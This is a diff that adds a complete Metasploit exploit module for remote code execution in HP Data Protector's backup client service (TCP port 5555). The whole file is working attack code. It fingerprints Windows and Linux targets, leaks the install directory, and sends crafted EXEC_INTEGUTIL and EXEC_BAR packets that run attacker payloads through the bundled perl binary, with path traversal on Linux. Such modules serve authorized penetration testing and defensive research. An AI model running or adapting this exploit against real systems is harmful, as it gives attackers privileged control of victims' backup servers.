@@ -1,0 +1,354 @@
+##
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = GreatRanking
+
+  include Msf::Exploit::Remote::Tcp
+  include Msf::Exploit::Powershell
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'            => 'HP Data Protector EXEC_INTEGUTIL Remote Code Execution',
+      'Description'     => %q{
+        This exploit abuses a vulnerability in the HP Data Protector. The vulnerability exists
+        in the Backup client service, which listens by default on TCP/5555. The EXEC_INTEGUTIL
+        request allows to execute arbitrary commands from a restricted directory. Since it
+        includes a perl executable, it's possible to use an EXEC_INTEGUTIL packet to execute
+        arbitrary code. On linux targets, the perl binary isn't on the restricted directory, but
+        an EXEC_BAR packet can be used to access the perl binary, even in the last version of HP
+        Data Protector for linux.  This module has been tested successfully on HP Data Protector
+        9 over Windows 2008 R2 64 bits and CentOS 6 64 bits.
+      },
+      'Author'          =>
+        [
+          'Aniway.Anyway <Aniway.Anyway[at]gmail.com>', # vulnerability discovery
+          'juan vazquez'                                # msf module
+        ],
+      'References'      =>
+        [
+          [ 'ZDI', '14-344']
+        ],
+      'Payload'        =>
+        {
+          'DisableNops' => true
+        },
+      'DefaultOptions'  =>
+        {
+          # The powershell embedded payload takes some time to deploy
+          'WfsDelay' => 20
+        },
+      'Targets'         =>
+        [
+          [ 'Linux 64 bits / HP Data Protector 9',
+            {
+              'Platform' => 'unix',
+              'Arch'     => ARCH_CMD,
+              'Payload' => {
+                'Compat' => {
+                  'PayloadType' => 'cmd cmd_bash',
+                  'RequiredCmd' => 'perl gawk bash-tcp openssl python generic'
+                }
+              }
+            }
+          ],
+          [ 'Windows 64 bits / HP Data Protector 9',
+            {
+              'Platform' => 'win',
+              'Arch'     => ARCH_CMD,
+              'Payload' => {
+                'Compat' => {
+                  'PayloadType' => 'cmd',
+                  'RequiredCmd' => 'powershell'
+                }
+              }
+            }
+          ]
+        ],
+      'DefaultTarget'   => 0,
+      'Privileged'      => true,
+      'DisclosureDate'  => 'Oct 2 2014'
+    ))
+
+    register_options(
+      [
+        Opt::RPORT(5555)
+      ], self.class)
+  end
+
+  def check
+    fingerprint = get_fingerprint
+
+    if fingerprint.nil?
+      return Exploit::CheckCode::Unknown
+    end
+
+    if fingerprint =~ /Data Protector A\.(\d+\.\d+)/
+      version = $1
+      vprint_status("#{peer} - Windows / HP Data Protector version #{version} found")
+    elsif fingerprint =~ / INET/
+      vprint_status("#{peer} - Linux / HP Data Protector found")
+      return Exploit::CheckCode::Detected
+    else
+      return Exploit::CheckCode::Safe
+    end
+
+    if Gem::Version.new(version) <= Gem::Version.new('9')
+      return Exploit::CheckCode::Appears
+    end
+
+    Exploit::CheckCode::Detected # there is no patch at the time of module writing
+  end
+
+  def exploit
+    rand_exec = rand_text_alpha(8)
+    print_status("#{peer} - Leaking the HP Data Protector directory...")
+    leak = leak_hp_directory(rand_exec)
+    dir = parse_dir(leak, rand_exec)
+
+    if dir.nil?
+      dir = default_hp_dir
+      print_error("#{peer} - HP Data Protector dir not found, using the default #{dir}")
+    else
+      unless valid_target?(dir)
+        print_error("#{peer} - HP Data Protector directory leaked as #{dir}, #{target.name} looks incorrect, trying anyway...")
+      end
+    end
+
+    if target.name =~ /Windows/
+      #command = cmd_psh_payload(payload.encoded, payload_instance.arch.first, {:remove_comspec => true, :encode_final_payload => true})
+      print_status("#{peer} - Executing payload...")
+      execute_windows(payload.encoded, dir)
+    else
+      print_status("#{peer} - Executing payload...")
+      execute_linux(payload.encoded, dir)
+    end
+  end
+
+  def peer
+    "#{rhost}:#{rport}"
+  end
+
+  def build_pkt(fields)
+    data = "\xff\xfe" # BOM Unicode
+    fields.each do |v|
+      data << "#{Rex::Text.to_unicode(v)}\x00\x00"
+      data << Rex::Text.to_unicode(" ") # Separator
+    end
+
+    data.chomp!(Rex::Text.to_unicode(" ")) # Delete last separator
+    return [data.length].pack("N") + data
+  end
+
+  def get_fingerprint
+    fingerprint = get_fingerprint_windows
+    if fingerprint.nil?
+      fingerprint = get_fingerprint_linux
+    end
+
+    fingerprint
+  end
+
+  def get_fingerprint_linux
+    connect
+
+    sock.put([2].pack("N") + "\xff\xfe")
+    begin
+      res = sock.get_once(4)
+    rescue EOFError
+      disconnect
+      return nil
+    end
+
+    if res.nil?
+      disconnect
+      return nil
+    else
+      length = res.unpack("N")[0]
+    end
+
+    begin
+      res = sock.get_once(length)
+    rescue EOFError
+      return nil
+    ensure
+      disconnect
+    end
+
+    if res.nil?
+      return nil
+    end
+
+    res
+  end
+
+  def get_fingerprint_windows
+    connect
+
+    sock.put(rand_text_alpha_upper(64))
+    begin
+    res = sock.get_once(4)
+    rescue ::Errno::ECONNRESET, EOFError
+      disconnect
+      return nil
+    end
+
+    if res.nil?
+      disconnect
+      return nil
+    else
+      length = res.unpack("N")[0]
+    end
+
+    begin
+      res = sock.get_once(length)
+    rescue EOFError
+      return nil
+    ensure
+      disconnect
+    end
+
+    if res.nil?
+      return nil
+    end
+
+    Rex::Text.to_ascii(res).chop.chomp # Delete unicode last null
+  end
+
+  def leak_hp_directory(rand_exec)
+    connect
+    pkt = build_pkt([
+      "2", # Message Type
+      rand_text_alpha(8),
+      rand_text_alpha(8),
+      rand_text_alpha(8),
+      rand_text_alpha(8),
+      rand_text_alpha(8),
+      "28", # Opcode EXEC_INTEGUTIL
+      rand_exec,
+    ])
+
+    sock.put(pkt)
+    begin
+      res = sock.get_once(4)
+    rescue EOFError
+      disconnect
+      return nil
+    end
+
+    if res.nil?
+      disconnect
+      return nil
+    else
+      length = res.unpack("N")[0]
+    end
+
+    begin
+    res = sock.get_once(length)
+    rescue EOFError
+      return nil
+    ensure
+      disconnect
+    end
+
+    if res.nil?
+      return nil
+    end
+
+    if res =~ /No such file or directory/ # Linux signature
+      return res
+    else # deal as windows target
+      return Rex::Text.to_ascii(res).chop.chomp # Delete unicode last null
+    end
+  end
+
+  def parse_dir(data, clue)
+    if data && data =~ /The system cannot find the file specified\..*(.:\\.*)bin\\#{clue}/
+      dir = $1
+      print_good("#{peer} - HP Data Protector directory found on #{dir}")
+    elsif data && data =~ /\]\x00 (\/.*)lbin\/#{clue}\x00 \[\d\] No such file or directory/
+      dir = $1
+      print_good("#{peer} - HP Data Protector directory found on #{dir}")
+    else
+      dir = nil
+    end
+
+    dir
+  end
+
+  def valid_target?(dir)
+    if target.name =~ /Windows/ && dir =~ /^[A-Za-z]:\\/
+      return true
+    elsif target.name =~ /Linux/ && dir.start_with?('/')
+      return true
+    end
+
+    false
+  end
+
+  def default_hp_dir
+    if target.name =~ /Windows/
+      dir = 'C:\\Program Files\\OmniBack\\'
+    else # linux
+      dir = '/opt/omni/lbin/'
+    end
+
+    dir
+  end
+
+  def execute_windows(cmd, hp_dir)
+    connect
+    pkt = build_pkt([
+      "2", # Message Type
+      rand_text_alpha(8),
+      rand_text_alpha(8),
+      rand_text_alpha(8),
+      rand_text_alpha(8),
+      rand_text_alpha(8),
+      "28", # Opcode EXEC_INTEGUTIL
+      "perl.exe",
+      "-I#{hp_dir}lib\\perl",
+      "-MMIME::Base64",
+      "-e",
+      "system(decode_base64('#{Rex::Text.encode_base64(cmd)}'))"
+    ])
+    sock.put(pkt)
+    disconnect
+  end
+
+  def execute_linux(cmd, hp_dir)
+    connect
+    pkt = build_pkt([
+      '2', # Message Type
+      rand_text_alpha(8),
+      rand_text_alpha(8),
+      rand_text_alpha(8),
+      rand_text_alpha(8),
+      rand_text_alpha(8),
+      '11', # Opcode EXEC_BAR
+      rand_text_alpha(8),
+      rand_text_alpha(8),
+      rand_text_alpha(8),
+      rand_text_alpha(8),
+      rand_text_alpha(8),
+      rand_text_alpha(8),
+      rand_text_alpha(8),
+      rand_text_alpha(8),
+      rand_text_alpha(8),
+      rand_text_alpha(8),
+      rand_text_alpha(8),
+      "../bin/perl",
+      rand_text_alpha(8),
+      "-I#{hp_dir}lib/perl",
+      '-MMIME::Base64',
+      '-e',
+      "system(decode_base64('#{Rex::Text.encode_base64(cmd)}'))"
+    ])
+    sock.put(pkt)
+    disconnect
+  end
+end
